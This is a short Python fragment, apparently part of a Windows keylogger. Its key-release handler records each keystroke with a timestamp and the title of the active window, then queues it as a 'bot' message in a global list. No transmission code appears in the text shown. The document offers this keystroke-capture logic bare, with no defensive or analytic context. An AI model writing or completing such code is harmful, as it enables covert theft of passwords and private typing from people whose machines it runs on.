from datetime import datetime
import win32gui

llista_teclas = []

def detect_k(key):
    print(f"Tecla detectada: {str(key)}")

def release_k(key):
    global llista_teclas
    hwnd = win32gui.GetForegroundWindow()
    window_title = win32gui.GetWindowText(hwnd)
    tecla = str(key)
    timestamp = datetime.now().strftime("[%H-%M-%S]")
    mensaje_bot = f"{timestamp} |{window_title.strip()}|  {tecla}"
    llista_teclas.append(mensaje_bot)